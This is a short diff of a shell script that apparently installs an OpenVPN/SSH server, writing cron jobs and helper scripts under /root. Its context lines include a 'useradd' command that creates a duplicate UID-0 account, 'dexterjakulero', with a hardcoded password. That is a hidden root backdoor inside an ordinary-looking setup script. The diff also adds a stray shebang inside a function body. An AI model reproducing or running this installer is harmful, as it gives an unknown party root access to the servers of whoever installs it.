@@ -636,6 +636,7 @@ systemctl start openvpn@server
 }
 
 serviceenable () {
+#!/bin/bash
 /bin/cat <<"EOM" >/root/cron.sh
 php /usr/local/sbin/ssh.php
 chmod +x /root/active.sh
@@ -934,6 +935,7 @@ cat << EOF > /var/spool/cron/root
 */5 * * * * /bin/bash /root/auto >/dev/null 2>&1
 EOF
 
+bash /root/cron.sh
 bash /root/auto
 
 useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
